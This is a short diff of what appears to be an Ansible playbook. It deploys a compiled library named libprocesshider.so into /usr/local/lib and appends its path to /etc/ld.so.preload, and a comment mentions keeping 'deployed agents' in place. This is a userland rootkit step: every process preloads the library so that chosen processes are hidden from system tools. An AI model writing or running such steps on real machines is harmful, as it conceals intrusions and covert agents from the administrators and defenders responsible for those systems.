@@ -129,10 +129,10 @@
       ignore_errors: yes
 
     - name: Move compiled .so and update /etc/ld.so.preload
-      shell: "mv {{ deploy_dir }}/process.so /usr/local/lib/"
+      shell: "mv {{ deploy_dir }}/libprocesshider.so /usr/local/lib/"
     
     - name: echo to preload
-      shell: "echo '/usr/local/lib/process.so' >> /etc/ld.so.preload"
+      shell: "echo '/usr/local/lib/libprocesshider.so' >> /etc/ld.so.preload"
 
     ###################################################################
     # Clean up only source files, not the deployed agents
